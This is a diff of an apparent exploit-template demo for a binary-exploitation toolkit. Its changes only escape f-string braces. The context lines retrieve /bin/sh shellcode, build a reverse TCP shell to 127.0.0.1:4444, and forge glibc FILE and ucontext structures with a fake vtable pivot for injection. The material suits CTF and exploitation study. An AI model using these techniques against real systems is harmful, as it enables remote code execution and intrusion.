@@ -94,7 +94,7 @@ def exploit(*args, **kwargs):
 
     # 2) retrieve by arch + name, default variant (min)
     sc = ShellcodeReigstry.get("amd64", "execve_bin_sh")
-    print(f"[+] Got shellcode: {sc.name} ({sc.arch}), {len(sc.blob)} bytes")
+    print(f"[+] Got shellcode: {{sc.name}} ({{sc.arch}}), {{len(sc.blob)}} bytes")
     print(hex_shellcode(sc.blob))   # output as hex
 
     # 3) pretty dump
@@ -102,23 +102,23 @@ def exploit(*args, **kwargs):
 
     # 4) retrieve explicit variant
     sc = ShellcodeReigstry.get("i386", "execve_bin_sh", variant=33)
-    print(f"[+] Got shellcode: {sc.name} ({sc.arch}), {len(sc.blob)} bytes")
+    print(f"[+] Got shellcode: {{sc.name}} ({{sc.arch}}), {{len(sc.blob)}} bytes")
     print(hex_shellcode(sc.blob))
 
     # 5) retrieve via composite key
     sc = ShellcodeReigstry.get(None, "amd64:execveat_bin_sh:29")
-    print(f"[+] Got shellcode: {sc.name}")
+    print(f"[+] Got shellcode: {{sc.name}}")
     print(hex_shellcode(sc.blob))
 
     # 6) fuzzy lookup
     sc = ShellcodeReigstry.get("amd64", "ls_")
-    print(f"[+] Fuzzy match: {sc.name}")
+    print(f"[+] Fuzzy match: {{sc.name}}")
     print(hex_shellcode(sc.blob))
 
     # 7) builder demo: reverse TCP shell (amd64)
     builder = ShellcodeBuilder("amd64")
     rev = builder.build_reverse_tcp_shell("127.0.0.1", 4444)
-    print(f"[+] Built reverse TCP shell ({len(rev)} bytes)")
+    print(f"[+] Built reverse TCP shell ({{len(rev)}} bytes)")
     print(hex_shellcode(rev))
 
     # - IO FILE exploit
@@ -157,13 +157,13 @@ def exploit(*args, **kwargs):
     # 6) create a snapshot for FILE
     snapshot = f.bytes          # or: f.to_bytes()
     snapshot2 = f.data          # use the `data` bytearray class member
-    print(f"[+] IO FILE snapshot in bytes:\n{snapshot}\n{snapshot2})")
+    print(f"[+] IO FILE snapshot in bytes:\n{{snapshot}}\n{{snapshot2}})")
 
     # 7) create an IOFilePlus class object by importing a data blob
     f2 = IOFilePlus.from_bytes(blob=snapshot, arch="amd64")
     
     # 8) Load IOFilePlus data like glibc
-    f.load({
+    f.load({{
         # housekeeping
         "_flags": 0xfbad0000,				  # 0x00               
         # readable window (no active read buffer)
@@ -200,7 +200,7 @@ def exploit(*args, **kwargs):
         "_unused2":      b"\x00"*0x14,        # 0xc4
         # pivot: fake vtable 
         "vtable":        0xdeadbeefcafebabe,  # 0xd8  
-    }, strict=True)
+    }}, strict=True)
     
     # dump bytes for injection
     blob = f.bytes
@@ -229,7 +229,7 @@ def exploit(*args, **kwargs):
     raw_mask = b"\x00" * 0x80
     uc.set("uc_sigmask[128]", raw_mask)
     # use the load() method
-    uc.load({
+    uc.load({{
         # gregs
         "R8":  0,		# 0x28
         "R9":  0,		# 0x30
@@ -249,7 +249,7 @@ def exploit(*args, **kwargs):
         # floating point stuff
         "FPREGS": 0x404000,    	# 0xB0: fldenv pointer
         "MXCSR":  0x1F80,      	# 0x1C0: default safe SSE state
-    }, strict=True)
+    }}, strict=True)
     uc.dump()
 
     # dump bytes for injection
